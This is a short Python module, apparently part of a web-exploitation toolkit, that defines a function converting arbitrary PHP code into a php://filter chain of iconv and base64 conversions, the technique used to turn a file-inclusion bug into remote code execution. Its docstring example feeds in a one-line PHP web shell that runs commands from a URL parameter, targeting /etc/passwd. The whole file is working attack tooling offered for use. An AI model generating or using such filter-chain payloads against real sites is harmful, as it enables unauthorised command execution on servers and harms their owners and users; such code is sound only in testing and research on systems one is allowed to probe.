import base64

from . import const as WebConst


def php2filterchain(php: str, resource: str) -> str:
    '''
    ### Example

    ```py
    php = '<?php system($_GET["cmd"]); ?>'
    filterchain = php2filterchain(php, '/etc/passwd')
    # filterchain = 'php://filter/.../resource=/etc/passwd'
    ```
    '''

    php += ' ' * (3 - (len(php) % 3))
    payload = base64.b64encode(php.encode()).decode()

    filters = ['convert.iconv.UTF8.CSISO2022KR', 'convert.base64-encode', 'convert.iconv.UTF8.UTF7']
    for char in reversed(payload):
        filters += WebConst.CHAR2PHPFILTER[char] + ['convert.base64-decode', 'convert.base64-encode', 'convert.iconv.UTF8.UTF7']
    filters += ['convert.base64-decode']

    return f'php://filter/{"/".join(filters)}/resource={resource}'

